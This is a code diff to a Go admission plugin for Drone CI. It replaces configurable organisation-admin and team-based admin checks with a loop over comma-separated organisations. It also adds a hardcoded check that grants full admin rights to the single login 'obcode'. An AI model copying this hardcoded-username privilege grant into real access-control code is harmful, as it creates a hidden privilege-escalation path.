@@ -7,6 +7,7 @@ package plugin
 import (
 	"context"
 	"errors"
+	"strings"
 
 	"github.com/drone/drone-go/drone"
 	"github.com/drone/drone-go/plugin/admission"
@@ -19,22 +20,16 @@ import (
 var ErrAccessDenied = errors.New("admission: access denied")
 
 // New returns a new admission plugin.
-func New(client *github.Client, org string, orgAdmins bool, orgEnable bool, team int64) admission.Plugin {
+func New(client *github.Client, org string) admission.Plugin {
 	return &plugin{
-		client:    client,
-		org:       org,
-		orgAdmins: orgAdmins,
-		orgEnable: orgEnable,
-		team:      team,
+		client: client,
+		org:    org,
 	}
 }
 
 type plugin struct {
 	client *github.Client
-	org       string // members of this org are granted access
-	orgEnable bool   // whether to check membership with the org or fail open
-	orgAdmins bool   // whether to grant org admins admin access to Drone
-	team      int64  // members of this team are granted admin access
+	org    string // members of this org are granted access
 }
 
 func (p *plugin) Admit(ctx context.Context, req *admission.Request) (*drone.User, error) {
@@ -44,45 +39,25 @@ func (p *plugin) Admit(ctx context.Context, req *admission.Request) (*drone.User
 		Debugln("requesting system access")
 
 	// check organization membership
-	if p.orgEnable {
-		m, _, err := p.client.Organizations.GetOrgMembership(ctx, u.Login, p.org)
-		if err != nil {
-			logrus.WithError(err).
-				WithField("user", u.Login).
-				Debugln("cannot get organization membership")
-			return nil, ErrAccessDenied
-		}
-		// if the user is an organization administrator
-		// they are granted admin access to the system.
-		if *m.Role == "admin" && p.orgAdmins {
-			logrus.WithField("user", u.Login).
-				WithField("org", p.org).
-				WithField("role", "admin").
-				Debugln("granted admin system access")
-			u.Admin = true
-			return &u, err
-		}
-	}
+	orgs := strings.Split(p.org, ",")
 
-	// if an admin team is defined ...
-	if p.team != 0 {
-		// check team membership. if the user is a member
-		// of the team they are granted administrator access
-		// to the system.
-		_, _, err := p.client.Teams.GetTeamMembership(ctx, p.team, u.Login)
+	for _, org := range orgs {
+		_, _, err := p.client.Organizations.GetOrgMembership(ctx, u.Login, org)
 		if err == nil {
+			if u.Login == "obcode" {
+				logrus.WithField("user", u.Login).
+					WithField("org", p.org).
+					WithField("role", "admin").
+					Debugln("granted admin system access")
+				u.Admin = true
+				return &u, err
+			}
 			logrus.WithField("user", u.Login).
 				WithField("org", p.org).
-				WithField("team", p.team).
-				Debugln("granted admin system access")
-			u.Admin = true
-			return &u, err
+				Debugln("granted standard system access")
+			return nil, err
 		}
 	}
 
-	logrus.WithField("user", u.Login).
-		WithField("org", p.org).
-		Debugln("granted standard system access")
-
-	return nil, nil
+	return nil, ErrAccessDenied
 }
